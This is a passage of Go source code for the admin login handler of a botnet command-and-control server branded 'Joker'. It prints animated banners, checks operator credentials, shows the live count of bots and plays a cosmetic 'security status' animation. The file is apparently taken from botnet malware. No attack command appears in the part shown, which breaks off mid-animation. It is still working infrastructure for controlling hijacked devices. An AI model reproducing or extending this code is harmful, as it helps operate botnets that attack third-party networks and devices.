/*
Joker
*/
package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)
//@blazing_runs
type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [+] Please Provide Us With Login Details To Access Joker Botnet [+]\007"))); err != nil {//38m
                this.conn.Close()
            }
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╚════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))            
            this.conn.Write([]byte("\x1b[1;32m                        ║\x1b[1;35mUsername ═\x1b[1;32m➢ \x1b[1;35m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;32m                        ║\x1b[1;35mUsername ═\x1b[1;32m➢ \x1b[1;35m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;37m                        ║Invalid Credentials. Connection Logged!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Joker ~ %d 0days | Server: [63] | Api's Online: [34] | Plan: [Normal] | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mCNC Cashe Cleared  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╚══════════════════════════════════════════╝\r\n"))
                 time.Sleep(500 * time.Millisecond)
	         this.conn.Write([]byte("\033[2J\033[1H"))
		 this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Hashed    ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mMasked Session     ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mEcryption          ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mHashed Login       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mIPLogger           ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mAutoScreener       ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSharing Detection  ............ [\033[32mACTIVE\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSession Locked     ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mTraffic Spoofed    ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mProxied Connection ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDatabase Relocated ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mDiscord Webhooks   ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;32mSpoofed Bot Conns  ............ [\033[31m?\x1b[1;32m] \x1b[1;35m║\r\n"))
